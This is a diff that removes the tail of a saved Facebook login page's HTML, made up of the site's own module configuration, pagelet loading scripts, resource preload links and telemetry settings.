-              ["__elem_ec77afbd_0_0_kJ", "u_0_7_EV", 2],
-              ["__elem_1de146dc_0_1_Wz", "u_0_8_r3", 1],
-              ["__elem_ec77afbd_0_1_ot", "u_0_9_Ul", 2],
-              ["__elem_a588f507_0_0_bk", "globalContainer", 2],
-              ["__elem_a588f507_0_2_Wy", "content", 1],
-              ["__elem_835c633a_0_0_m1", "u_0_a_OZ", 1],
-              ["__elem_9f5fac15_0_0_C2", "passContainer", 1],
-              ["__elem_558608f3_0_0_aQ", "pass", 1],
-              ["__elem_a588f507_0_3_RY", "u_0_b_nf", 1],
-              ["__elem_a588f507_0_4_er", "u_0_c_3I", 1],
-              ["__elem_45d73b5d_0_0_9a", "u_0_d_5u", 1],
-            ],
-            require: [
-              ["ServiceWorkerLoginAndLogout", "login", [], []],
-              ["WebPixelRatioDetector", "startDetecting", [], [false]],
-              [
-                "ScriptPath",
-                "set",
-                [],
-                [
-                  "XIndexReduxController",
-                  "a1f3c513",
-                  {
-                    imp_id: "0lVvD6NfemVaY72nP",
-                    ef_page: null,
-                    uri: "https:\/\/www.facebook.com\/",
-                  },
-                ],
-              ],
-              ["UITinyViewportAction", "init", [], []],
-              [
-                "ResetScrollOnUnload",
-                "init",
-                ["__elem_a588f507_0_0_bk"],
-                [{ __m: "__elem_a588f507_0_0_bk" }],
-              ],
-              [
-                "AccessibilityWebVirtualCursorClickLogger",
-                "init",
-                ["__elem_a588f507_0_0_bk"],
-                [[{ __m: "__elem_a588f507_0_0_bk" }]],
-              ],
-              ["KeyboardActivityLogger", "init", [], []],
-              ["FocusRing", "init", [], []],
-              ["ErrorMessageConsole", "listenForUncaughtErrors", [], []],
-              ["HardwareCSS", "init", [], []],
-              [
-                "NavigationAssistantController",
-                "init",
-                [
-                  "__elem_3fc3da18_0_0_Ke",
-                  "__elem_51be6cb7_0_0_\/m",
-                  "__inst_5b4d0c00_0_0_1t",
-                  "__inst_5b4d0c00_0_1_zs",
-                  "__inst_e5ad243d_0_0_YI",
-                  "__inst_e5ad243d_0_1_eY",
-                ],
-                [
-                  { __m: "__elem_3fc3da18_0_0_Ke" },
-                  { __m: "__elem_51be6cb7_0_0_\/m" },
-                  { __m: "__inst_5b4d0c00_0_0_1t" },
-                  { __m: "__inst_5b4d0c00_0_1_zs" },
-                  null,
-                  {
-                    accessibilityPopoverMenu: { __m: "__inst_e5ad243d_0_0_YI" },
-                    globalPopoverMenu: null,
-                    sectionsPopoverMenu: { __m: "__inst_e5ad243d_0_1_eY" },
-                  },
-                  true,
-                ],
-              ],
-              ["__inst_e5ad243d_0_1_eY"],
-              ["__inst_1de146dc_0_0_3l"],
-              ["__inst_e5ad243d_0_0_YI"],
-              ["__inst_1de146dc_0_1_cq"],
-              ["IntlUtils"],
-              [
-                "LoginFormController",
-                "init",
-                ["__elem_835c633a_0_0_m1", "__elem_45d73b5d_0_0_9a"],
-                [
-                  { __m: "__elem_835c633a_0_0_m1" },
-                  { __m: "__elem_45d73b5d_0_0_9a" },
-                  null,
-                  true,
-                  {
-                    pubKey: {
-                      publicKey:
-                        "77f9792a38bc63c034ff277d67ddf1690f52d5bcf01eadbb8c8bfca607283a61",
-                      keyId: 206,
-                    },
-                  },
-                ],
-              ],
-              [
-                "BrowserPrefillLogging",
-                "initContactpointFieldLogging",
-                [],
-                [{ contactpointFieldID: "email", serverPrefill: "" }],
-              ],
-              [
-                "BrowserPrefillLogging",
-                "initPasswordFieldLogging",
-                [],
-                [{ passwordFieldID: "pass" }],
-              ],
-              ["FocusListener"],
-              ["FlipDirectionOnKeypress"],
-              [
-                "LoginFormToggle",
-                "initToggle",
-                [
-                  "__elem_a588f507_0_3_RY",
-                  "__elem_a588f507_0_4_er",
-                  "__elem_558608f3_0_0_aQ",
-                  "__elem_9f5fac15_0_0_C2",
-                ],
-                [
-                  { __m: "__elem_a588f507_0_3_RY" },
-                  { __m: "__elem_a588f507_0_4_er" },
-                  { __m: "__elem_558608f3_0_0_aQ" },
-                  { __m: "__elem_9f5fac15_0_0_C2" },
-                ],
-              ],
-              ["FBLynx", "setupDelegation", [], []],
-              ["Animation"],
-              ["PageTransitions"],
-              [
-                "RequireDeferredReference",
-                "unblock",
-                [],
-                [
-                  [
-                    "BanzaiScuba_DEPRECATED",
-                    "Animation",
-                    "FbtLogging",
-                    "IntlQtEventFalcoEvent",
-                    "PageTransitions",
-                  ],
-                  "sd",
-                ],
-              ],
-              [
-                "RequireDeferredReference",
-                "unblock",
-                [],
-                [
-                  [
-                    "BanzaiScuba_DEPRECATED",
-                    "Animation",
-                    "FbtLogging",
-                    "IntlQtEventFalcoEvent",
-                    "PageTransitions",
-                  ],
-                  "css",
-                ],
-              ],
-              ["TimeSliceImpl"],
-              ["HasteSupportData"],
-              ["ServerJS"],
-              ["Run"],
-              ["InitialJSLoader"],
-            ],
-            contexts: [
-              [{ __m: "__elem_a588f507_0_1_Ei" }, true],
-              [{ __m: "__elem_a588f507_0_2_Wy" }, true],
-            ],
-          });
-          requireLazy(["Run"], function (Run) {
-            Run.onAfterLoad(function () {
-              s.cleanup(TimeSlice);
-            });
-          });
-        }
-      );
-    </script>
-    <script>
-      now_inl = (function () {
-        var p = window.performance;
-        return p && p.now && p.timing && p.timing.navigationStart
-          ? function () {
-              return p.now() + p.timing.navigationStart;
-            }
-          : function () {
-              return new Date().getTime();
-            };
-      })();
-      window.__bigPipeFR = now_inl();
-    </script>
-    <link
-      rel="preload"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/zvfS2wV_bL3.css?_nc_x=Ij3Wp8lg5Kz"
-      as="style"
-      crossorigin="anonymous"
-    />
-    <link
-      rel="preload"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/y3/l/0,cross/5WfpJC2KSHe.css?_nc_x=Ij3Wp8lg5Kz"
-      as="style"
-      crossorigin="anonymous"
-    />
-    <link
-      rel="preload"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/EE0cKe4KBQ3.css?_nc_x=Ij3Wp8lg5Kz"
-      as="style"
-      crossorigin="anonymous"
-    />
-    <link
-      rel="preload"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/l/0,cross/S81YVWe8H_A.css?_nc_x=Ij3Wp8lg5Kz"
-      as="style"
-      crossorigin="anonymous"
-    />
-    <link
-      rel="preload"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/yc/l/0,cross/PG5tRCkVwWX.css?_nc_x=Ij3Wp8lg5Kz"
-      as="style"
-      crossorigin="anonymous"
-    />
-    <link
-      rel="preload"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3ij9m4/yY/l/en_GB/U-S1pvGpBD_.js?_nc_x=Ij3Wp8lg5Kz"
-      as="script"
-      crossorigin="anonymous"
-      nonce=""
-    />
-    <link
-      rel="preload"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/y0/r/PvBFn7IF58H.js?_nc_x=Ij3Wp8lg5Kz"
-      as="script"
-      crossorigin="anonymous"
-      nonce=""
-    />
-    <link
-      rel="preload"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/yS/r/UXJE_KFXmfT.js?_nc_x=Ij3Wp8lg5Kz"
-      as="script"
-      crossorigin="anonymous"
-      nonce=""
-    />
-    <link
-      rel="preload"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/ymUKktuYtLv.js?_nc_x=Ij3Wp8lg5Kz"
-      as="script"
-      crossorigin="anonymous"
-      nonce=""
-    />
-    <link
-      rel="preload"
-      href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/l/0,cross/tkUx0C0mTdH.css?_nc_x=Ij3Wp8lg5Kz"
-      as="style"
-      crossorigin="anonymous"
-    />
-    <script>
-      window.__bigPipeCtor = now_inl();
-      requireLazy(["BigPipe"], function (BigPipe) {
-        define("__bigPipe", [], (window.bigPipe = new BigPipe({
-          forceFinish: true,
-          config: {
-            flush_pagelets_asap: true,
-            dispatch_pagelet_replayable_actions: false,
-          },
-        })));
-      });
-    </script>
-    <script nonce="">
-      (function () {
-        var n = now_inl();
-        requireLazy(["__bigPipe"], function (bigPipe) {
-          bigPipe.beforePageletArrive("first_response", n);
-        });
-      })();
-    </script>
-    <script nonce="">
-      requireLazy(["__bigPipe"], function (bigPipe) {
-        bigPipe.onPageletArrive({
-          displayResources: [
-            "KeLRD1z",
-            "XCvu4Ie",
-            "+xujYrB",
-            "tH07smz",
-            "tvWqIy4",
-            "jpW6YKq",
-            "VdF6ypd",
-            "ZaK7abM",
-            "s84NfZE",
-            "U7cyoYM",
-            "P/mr5VE",
-          ],
-          id: "first_response",
-          phase: 0,
-          last_in_phase: true,
-          tti_phase: 0,
-          all_phases: [63],
-          hsrp: { hblp: { consistency: { rev: 1005083598 } } },
-          allResources: [
-            "jpW6YKq",
-            "fmA3M6T",
-            "vhw5GRt",
-            "UiX2b//",
-            "GKQxLch",
-            "R0lSirj",
-            "VdF6ypd",
-            "ZaK7abM",
-            "s84NfZE",
-            "Vlvz+ek",
-            "BDpTGZx",
-            "KeLRD1z",
-            "XCvu4Ie",
-            "+xujYrB",
-            "tH07smz",
-            "tvWqIy4",
-            "U7cyoYM",
-            "79Y8bmL",
-            "WSN8hNl",
-            "P/mr5VE",
-            "CGkH4FY",
-            "nc2ZTn5",
-            "qIKb5tG",
-          ],
-        });
-      });
-    </script>
-    <script>
-      requireLazy(["__bigPipe"], function (bigPipe) {
-        bigPipe.setPageID("7065651880395410549-0");
-      });
-      CavalryLogger.setPageID("7065651880395410549-0");
-    </script>
-    <script nonce="">
-      (function () {
-        var n = now_inl();
-        requireLazy(["__bigPipe"], function (bigPipe) {
-          bigPipe.beforePageletArrive("last_response", n);
-        });
-      })();
-    </script>
-    <script nonce="">
-      requireLazy(["__bigPipe"], function (bigPipe) {
-        bigPipe.onPageletArrive({
-          displayResources: ["ZaK7abM"],
-          id: "last_response",
-          phase: 63,
-          last_in_phase: true,
-          the_end: true,
-          jsmods: {
-            define: [
-              [
-                "TimeSliceInteractionSV",
-                [],
-                {
-                  on_demand_reference_counting: true,
-                  on_demand_profiling_counters: true,
-                  default_rate: 1000,
-                  lite_default_rate: 100,
-                  interaction_to_lite_coinflip: {
-                    ADS_INTERFACES_INTERACTION: 0,
-                    ads_perf_scenario: 0,
-                    ads_wait_time: 0,
-                    Event: 1,
-                  },
-                  interaction_to_coinflip: {
-                    ADS_INTERFACES_INTERACTION: 1,
-                    ads_perf_scenario: 1,
-                    ads_wait_time: 1,
-                    Event: 100,
-                  },
-                  enable_heartbeat: true,
-                  maxBlockMergeDuration: 0,
-                  maxBlockMergeDistance: 0,
-                  enable_banzai_stream: true,
-                  user_timing_coinflip: 50,
-                  banzai_stream_coinflip: 0,
-                  compression_enabled: true,
-                  ref_counting_fix: false,
-                  ref_counting_cont_fix: false,
-                  also_record_new_timeslice_format: false,
-                  force_async_request_tracing_on: false,
-                },
-                2609,
-              ],
-              [
-                "WebDriverConfig",
-                [],
-                {
-                  isTestRunning: false,
-                  isJestE2ETestRun: false,
-                  auxiliaryServiceInfo: {},
-                  testPath: null,
-                  originHost: null,
-                },
-                5332,
-              ],
-              [
-                "cr:1642797",
-                ["BanzaiBase"],
-                {
-                  __rc: [
-                    "BanzaiBase",
-                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1458113",
-                [],
-                {
-                  __rc: [
-                    null,
-                    "Aa2WcjouxcPOy3fMn-y0XlgLzEjIox58ujJDx3k-3Q__NnflxAXGCamBc5tY0Gl-Zxx0OXtugSi7uqzODC6HpkCzTjrts94",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1039",
-                [],
-                {
-                  __rc: [
-                    null,
-                    "Aa3J4nvRiqNUY-jaLoo6BkVtkmOn0iHGcJsRdik4N62wXbUKxdRG_c8Nnv8UtFTIoQTpgOXRj6o",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1041",
-                [],
-                {
-                  __rc: [
-                    null,
-                    "Aa3J4nvRiqNUY-jaLoo6BkVtkmOn0iHGcJsRdik4N62wXbUKxdRG_c8Nnv8UtFTIoQTpgOXRj6o",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1048",
-                [],
-                {
-                  __rc: [
-                    null,
-                    "Aa3J4nvRiqNUY-jaLoo6BkVtkmOn0iHGcJsRdik4N62wXbUKxdRG_c8Nnv8UtFTIoQTpgOXRj6o",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:917439",
-                ["PageTransitionsBlue"],
-                {
-                  __rc: [
-                    "PageTransitionsBlue",
-                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1108857",
-                [],
-                {
-                  __rc: [
-                    null,
-                    "Aa1hcCoX9-1Req-fqQBRNkJh_cS4AgIjzFfPL9hMyPBFUrYrWwspARNojpjUT8eN1Szt5MPUK4KiZopC9A",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1294158",
-                ["React.classic"],
-                {
-                  __rc: [
-                    "React.classic",
-                    "Aa1vpoYcxLzWELr5CR-1fYM6kL5x2dCjSgKSUJGKYyQcLiqoDwLPqeJnASuWF_XQcK1JjdOuMh-vk7j-O6U8V_EpO_d2",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1294246",
-                ["ReactDOM.classic"],
-                {
-                  __rc: [
-                    "ReactDOM.classic",
-                    "Aa1vpoYcxLzWELr5CR-1fYM6kL5x2dCjSgKSUJGKYyQcLiqoDwLPqeJnASuWF_XQcK1JjdOuMh-vk7j-O6U8V_EpO_d2",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1069930",
-                [],
-                {
-                  __rc: [
-                    null,
-                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1083116",
-                ["XAsyncRequest"],
-                {
-                  __rc: [
-                    "XAsyncRequest",
-                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1083117",
-                [],
-                {
-                  __rc: [
-                    null,
-                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:11202",
-                [],
-                {
-                  __rc: [
-                    null,
-                    "Aa1hcCoX9-1Req-fqQBRNkJh_cS4AgIjzFfPL9hMyPBFUrYrWwspARNojpjUT8eN1Szt5MPUK4KiZopC9A",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:888908",
-                ["warningBlue"],
-                {
-                  __rc: [
-                    "warningBlue",
-                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:971473",
-                ["LayerHideOnTransition"],
-                {
-                  __rc: [
-                    "LayerHideOnTransition",
-                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1105154",
-                [],
-                {
-                  __rc: [
-                    null,
-                    "Aa1hcCoX9-1Req-fqQBRNkJh_cS4AgIjzFfPL9hMyPBFUrYrWwspARNojpjUT8eN1Szt5MPUK4KiZopC9A",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "BanzaiConfig",
-                [],
-                {
-                  MAX_SIZE: 10000,
-                  MAX_WAIT: 150000,
-                  MIN_WAIT: null,
-                  RESTORE_WAIT: 150000,
-                  blacklist: ["time_spent"],
-                  disabled: false,
-                  gks: {
-                    boosted_pagelikes: true,
-                    mercury_send_error_logging: true,
-                    platform_oauth_client_events: true,
-                    graphexplorer: true,
-                    sticker_search_ranking: true,
-                  },
-                  known_routes: [
-                    "artillery_javascript_actions",
-                    "artillery_javascript_trace",
-                    "artillery_logger_data",
-                    "logger",
-                    "falco",
-                    "gk2_exposure",
-                    "js_error_logging",
-                    "loom_trace",
-                    "marauder",
-                    "perfx_custom_logger_endpoint",
-                    "qex",
-                    "require_cond_exposure_logging",
-                    "sri_logger_data",
-                  ],
-                  should_drop_unknown_routes: true,
-                  should_log_unknown_routes: false,
-                },
-                7,
-              ],
-              [
-                "PageTransitionsConfig",
-                [],
-                { reloadOnBootloadError: true },
-                1067,
-              ],
-              ["CoreWarningGK", [], { forceWarning: false }, 725],
-              [
-                "cr:692209",
-                ["cancelIdleCallbackBlue"],
-                {
-                  __rc: [
-                    "cancelIdleCallbackBlue",
-                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1292365",
-                ["React-prod.classic"],
-                {
-                  __rc: [
-                    "React-prod.classic",
-                    "Aa1hcCoX9-1Req-fqQBRNkJh_cS4AgIjzFfPL9hMyPBFUrYrWwspARNojpjUT8eN1Szt5MPUK4KiZopC9A",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1344485",
-                ["ReactDOM.classic.prod-or-profiling"],
-                {
-                  __rc: [
-                    "ReactDOM.classic.prod-or-profiling",
-                    "Aa1hcCoX9-1Req-fqQBRNkJh_cS4AgIjzFfPL9hMyPBFUrYrWwspARNojpjUT8eN1Szt5MPUK4KiZopC9A",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:983844",
-                [],
-                {
-                  __rc: [
-                    null,
-                    "Aa1hcCoX9-1Req-fqQBRNkJh_cS4AgIjzFfPL9hMyPBFUrYrWwspARNojpjUT8eN1Szt5MPUK4KiZopC9A",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1344486",
-                ["ReactDOM.classic.prod"],
-                {
-                  __rc: [
-                    "ReactDOM.classic.prod",
-                    "Aa0IBQcvyZTl_2ijexUDL7TuiwjsDyjKT3fo1RnKASCBKAk6b-pai3tdcBgRCEUKzZrf7SjYx0q6ZNWtkN6yYUhsbDiDTnG6dw",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1344487",
-                ["ReactDOM-prod.classic"],
-                {
-                  __rc: [
-                    "ReactDOM-prod.classic",
-                    "Aa1nk0MPMsZP0kY5PjB6dqMT8Fme7I5Ozq_T2vi3_66fSD5QU5covq-8x30l0oNctWv1uX22hWBA5Zj_WATYts_unhVqf4nEVmFLl7iD",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1353359",
-                ["EventListenerImplForBlue"],
-                {
-                  __rc: [
-                    "EventListenerImplForBlue",
-                    "Aa2f3UvevyyFZCBfbQxUtdJ1HbntmLRrVdWyu13aIBDB6vJCAevOFqNTU9Rs6uW0TN2_ZFy8wuMSaRDhZTNyQUE45rEhAxqZhw",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "KillabyteProfilerConfig",
-                [],
-                {
-                  htmlProfilerModule: null,
-                  profilerModule: null,
-                  depTypes: { BL: "bl", NON_BL: "non-bl" },
-                },
-                1145,
-              ],
-              [
-                "QuicklingConfig",
-                [],
-                {
-                  version: "1005083706;0;",
-                  sessionLength: 30,
-                  inactivePageRegex:
-                    "^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|.+\\.pdf$|.+/settings/)",
-                  badRequestKeys: [
-                    "nonce",
-                    "access_token",
-                    "oauth_token",
-                    "xs",
-                    "checkpoint_data",
-                    "code",
-                  ],
-                  logRefreshOverhead: false,
-                },
-                60,
-              ],
-              [
-                "WebDevicePerfInfoData",
-                [],
-                {
-                  needsFullUpdate: true,
-                  needsPartialUpdate: false,
-                  shouldLogResourcePerf: false,
-                },
-                3977,
-              ],
-              [
-                "WebStorageMonsterLoggingURI",
-                [],
-                { uri: "https://facebook.com/ajax/webstorage/process_keys/?state=1" },
-                3032,
-              ],
-              [
-                "TrackingConfig",
-                [],
-                { domain: "https://pixel.facebook.com" },
-                325,
-              ],
-              ["BrowserPaymentHandlerConfig", [], { enabled: false }, 3904],
-              [
-                "TimeSpentConfig",
-                [],
-                { "0_delay": 0, "0_timeout": 8, delay: 1000, timeout: 64 },
-                142,
-              ],
-              [
-                "cr:1351741",
-                ["CometEventListener"],
-                {
-                  __rc: [
-                    "CometEventListener",
-                    "Aa0RJymEx6Ym1FIFROe8vgkablJvzVFQ90454LHVVs3bsvzJDGpT8X4liWHr3jThkRMme9hLpQX3iittY8t0CemsSKNoIS2KYzCL8j8RaIrCAG69bawp",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1634616",
-                ["UserActivityBlue"],
-                {
-                  __rc: [
-                    "UserActivityBlue",
-                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:844180",
-                ["TimeSpentImmediateActiveSecondsLoggerBlue"],
-                {
-                  __rc: [
-                    "TimeSpentImmediateActiveSecondsLoggerBlue",
-                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
-                  ],
-                },
-                -1,
-              ],
-              [
-                "cr:1187159",
-                ["BlueCompatBroker"],
-                {
-                  __rc: [
-                    "BlueCompatBroker",
-                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
-                  ],
-                },
-                -1,
-              ],
-              ["ImmediateActiveSecondsConfig", [], { sampling_rate: 0 }, 423],
-            ],
-            require: [
-              [
-                "BDClientSignalCollectionTrigger",
-                "startSignalCollection",
-                [],
-                [
-                  {
-                    sc: '{"t":1637128278,"c":[[30000,838801],[30001,838801],[30002,838801],[30003,838801],[30004,838801],[30005,838801],[30006,573585],[30007,838801],[30008,838801],[30012,838801],[30013,838801],[30015,806033],[30018,806033],[30040,806033],[30093,806033],[30094,806033],[30095,806033],[30101,541591],[30102,541591],[30103,541591],[30104,541591],[30106,806039],[30107,806039],[38000,541427],[38001,806643]]}',
-                    fds: 60,
-                    fda: 60,
-                    i: 60,
-                    sbs: 1,
-                    dbs: 100,
-                    bbs: 100,
-                    hbi: 60,
-                    rt: 262144,
-                    hbcbc: 2,
-                    hbvbc: 0,
-                    hbbi: 30,
-                    sid: -1,
-                    hbv: "2787578782426791893",
-                  },
-                ],
-              ],
-              ["CavalryLoggerImpl", "startInstrumentation", [], []],
-              [
-                "NavigationMetrics",
-                "setPage",
-                [],
-                [
-                  {
-                    page: "XIndexReduxController",
-                    page_type: "normal",
-                    page_uri: "https://www.facebook.com/",
-                    serverLID: "7065651880395410549-0",
-                  },
-                ],
-              ],
-              ["FalcoLoggerTransports", "attach", [], []],
-              ["Chromedome", "start", [], [{}]],
-              ["DimensionTracking"],
-              ["NavigationClickPointHandler"],
-              ["ServiceWorkerURLCleaner", "removeRedirectID", [], []],
-              ["WebDevicePerfInfoLogging", "doLog", [], []],
-              ["WebStorageMonster", "schedule", [], []],
-              ["ClickRefLogger"],
-              ["DetectBrokenProxyCache", "run", [], [0, "c_user"]],
-              ["Artillery", "disable", [], []],
-              ["ScriptPathLogger", "startLogging", [], []],
-              ["TimeSpentBitArrayLogger", "init", [], []],
-              [
-                "RequireDeferredReference",
-                "unblock",
-                [],
-                [["VisualCompletionGating"], "sd"],
-              ],
-              [
-                "RequireDeferredReference",
-                "unblock",
-                [],
-                [["VisualCompletionGating"], "css"],
-              ],
-            ],
-          },
-          hsrp: {
-            hsdp: {
-              clpData: {
-                1743095: { r: 1, s: 1 },
-                1871697: { r: 1, s: 1 },
-                1829319: { r: 1 },
-                1829320: { r: 1 },
-                1843988: { r: 1 },
-              },
-              gkxData: {
-                1652843: { result: false, hash: "AT6uh9NWRY4QEQoYvaA" },
-              },
-              qexData: { 661: { r: null } },
-            },
-            hblp: {
-              consistency: { rev: 1005083598 },
-              rsrcMap: {
-                "+hSNGdc": {
-                  type: "js",
-                  src: "https://static.xx.fbcdn.net/rsrc.php/v3idBq4/yn/l/en_GB/wJkMK4AoSeG.js?_nc_x=Ij3Wp8lg5Kz",
-                },
-                CBQ4zUl: {
-                  type: "js",
-                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yt/r/CyNJRkmXvyt.js?_nc_x=Ij3Wp8lg5Kz",
-                },
-                FEt5GzN: {
-                  type: "js",
-                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/cN-N4Eu_deZ.js?_nc_x=Ij3Wp8lg5Kz",
-                },
-              },
-              compMap: {
-                TransportSelectingClientSingleton: {
-                  r: ["rvsXwIm", "ZaK7abM", "F/p4sht"],
-                  rds: {
-                    m: [
-                      "ContextualConfig",
-                      "BladeRunnerClient",
-                      "DGWRequestStreamClient",
-                      "MqttLongPollingRunner",
-                      "BanzaiScuba_DEPRECATED",
-                    ],
-                    r: [
-                      "jM4vQSb",
-                      "+jRpToS",
-                      "+hSNGdc",
-                      "nc2ZTn5",
-                      "jpW6YKq",
-                      "u4NoyfU",
-                      "VdF6ypd",
-                      "s84NfZE",
-                      "14CUPgD",
-                      "zA+yJGG",
-                      "TPVHIx9",
-                    ],
-                  },
-                  be: 1,
-                },
-                RequestStreamCommonRequestStreamCommonTypes: {
-                  r: ["rvsXwIm"],
-                  be: 1,
-                },
-              },
-            },
-          },
-          allResources: [
-            "CBQ4zUl",
-            "s84NfZE",
-            "TPVHIx9",
-            "VdF6ypd",
-            "FEt5GzN",
-            "+jRpToS",
-            "w3Wk9lz",
-            "jyPWGxW",
-            "jpW6YKq",
-            "UiX2b//",
-            "fmA3M6T",
-            "GKQxLch",
-            "ZaK7abM",
-          ],
-          onload: [
-            'CavalryLogger.getInstance("7065651880395410549-0").setTTIEvent("t_domcontent");',
-          ],
-          onafterload: [
-            'CavalryLogger.getInstance("7065651880395410549-0").collectBrowserTiming(window)',
-            'window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp("t_paint");',
-            'if (window.ExitTime){CavalryLogger.getInstance("7065651880395410549-0").setValue("t_exit", window.ExitTime);};',
-          ],
         });
       });
     </script>
